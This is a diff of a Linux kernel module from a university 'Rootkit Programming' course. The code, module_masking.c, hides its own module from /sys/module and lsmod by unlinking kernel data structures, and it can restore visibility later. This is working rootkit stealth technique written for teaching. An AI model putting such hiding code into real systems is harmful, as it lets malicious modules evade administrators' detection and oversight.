@@ -4,9 +4,9 @@
 /*   Course: Rootkit Programming                                               */
 /*   Semester: WS 2015/16                                                      */
 /*   Team: 105                                                                 */
-/*   Assignment: 5                                                             */
+/*   Assignment: 7                                                             */
 /*                                                                             */
-/*   Filename: module_masker.c                                                 */
+/*   Filename: module_masking.c                                                */
 /*                                                                             */
 /*   Authors:                                                                  */
 /*       Name: Matei Pavaluca                                                  */
@@ -15,7 +15,7 @@
 /*       Name: Nedko Stefanov Nedkov                                           */
 /*       Email: nedko.stefanov.nedkov@gmail.com                                */
 /*                                                                             */
-/*   Date: November 2015                                                       */
+/*   Date: December 2015                                                       */
 /*                                                                             */
 /*   Usage: This module is hiding itself in the kernel context. Specifically,  */
 /*          it does not show up in /sys/module or in the output of lsmod.      */
@@ -29,20 +29,74 @@
 /*******************************************************************************/
 
 #include <linux/module.h>		/* Needed by all kernel modules */
-#include <linux/syscalls.h>		/* Needed for __NR_read */
 #include <linux/list.h>			/* Needed for linked list interface */
 
-#include "module_masking.h"
+
+/*******************************************************************************/
+/*                                                                             */
+/*                       DEFINITIONS - DECLARATIONS                            */
+/*                                                                             */
+/*******************************************************************************/
+
+
+/* Definition of macros */
+#define PRINT(str) printk(KERN_INFO "rootkit module_masking: %s\n", (str))
+#define DEBUG_PRINT(str) if (show_debug_messages) PRINT(str)
+
+
+/* Definition of global variables */
+static int show_debug_messages;
+static int module_is_hidden;	/* Current state of module (1 ~> hidden) */
+static struct list_head *module_prev;
+
+
+/* Declaration of functions */
+static int module_masking_init(int);
+static int module_masking_exit(void);
+
+static void mask_module(void);
+static void unmask_module(void);
+
+/* Implementation of functions below is taken from fs/kernfs/dir.c, lines 224-321 */
+static bool kernfs_unlink_sibling(struct kernfs_node *);
+static int kernfs_link_sibling(struct kernfs_node *);
+
+
+/*******************************************************************************/
+/*                                                                             */
+/*                                  CODE                                       */
+/*                                                                             */
+/*******************************************************************************/
+
+
+/* Initialization function */
+static int module_masking_init(int debug_mode_on)
+{
+	show_debug_messages = debug_mode_on;
+
+	mask_module();
+
+	DEBUG_PRINT("initialized");
+
+	return 0;
+}
+
+
+static int module_masking_exit(void)
+{
+	unmask_module();
+
+	DEBUG_PRINT("exited");
+
+	return 0;
+}
 
 
 /* Hide module from /sys/module and from the output of lsmod. Do so by
    removing entries of our module from kernel data structures */
-void hide_module(void)
+static void mask_module(void)
 {
 	struct kernfs_node *kernfs_node_ptr;
-
-	if (module_is_hidden)
-		return;
 
 	module_is_hidden = 1;
 
@@ -67,12 +121,14 @@ void hide_module(void)
 	/* THIS_MODULE is of type: struct module - mkobj is of type: struct module_kobject -
        kobj is of type: struct kobject - sd is of type: struct kernfs_node*/
 	kernfs_unlink_sibling(kernfs_node_ptr);
+
+	DEBUG_PRINT("hiding mode on");
 }
 
 
 /* Unhide module from /sys/module and from the output of lsmod, so it becomes
    unloadable. Do so by re-adding entries of our module to kernel data structures */
-void unhide_module(void)
+static void unmask_module(void)
 {
 	struct kernfs_node *kernfs_node_ptr;
 
@@ -91,15 +147,17 @@ void unhide_module(void)
 	kernfs_node_ptr = THIS_MODULE->mkobj.kobj.sd;
 	kernfs_link_sibling(kernfs_node_ptr);
 
+	DEBUG_PRINT("hiding mode off");
+
 	/* The module is now visible in /sys/module and lsmod and can now be removed */
 }
 
 
-/*****************************************************************************/
-/*                                                                           */
-/*          CODE BELOW IS TAKEN FROM fs/kernfs/dir.c, lines 224-321          */
-/*                                                                           */
-/*****************************************************************************/
+/*******************************************************************************/
+/*                                                                             */
+/*          CODE BELOW IS TAKEN FROM fs/kernfs/dir.c, lines 224-321            */
+/*                                                                             */
+/*******************************************************************************/
 
 static int kernfs_name_compare(unsigned int hash, const char *name,
                                const void *ns, const struct kernfs_node *kn)
@@ -190,4 +248,4 @@ static bool kernfs_unlink_sibling(struct kernfs_node *kn)
 	return true;
 }
 
-/*****************************************************************************/
+/*******************************************************************************/
